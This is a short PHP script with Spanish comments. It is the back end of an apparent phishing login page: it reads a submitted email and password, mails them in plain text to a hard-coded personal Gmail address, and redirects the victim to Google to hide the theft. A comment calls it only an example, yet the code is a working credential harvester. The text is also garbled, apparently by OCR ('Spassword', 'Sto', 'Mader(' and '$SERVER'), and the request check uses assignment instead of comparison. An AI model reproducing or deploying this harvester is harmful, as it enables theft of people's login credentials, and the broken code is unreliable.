<?php

if ($SERVER["REQUEST_METHOD"] = "POST") {

$email = $_POST["email"];

Spassword = $_POST["password"];

// Aquí podrías realizar más validaciones y procesamiento de datos

// Enviar un correo electrónico con los datos (ESTO ES SOLO UN EJEMPLO,

Sto = "andresramirezconde799@gmail.com";

$subject = "Nuevo inicio de sesión";

$message = "Correo electrónico: $email\nContraseña: $password";

mail($to, $subject, $message);

// Redirigir a Google después de enviar el correo electrónico Mader("Location: https://www.google.com");

exit(); // Asegura que no se ejecuten más instrucciones después de la redirecion

}

?>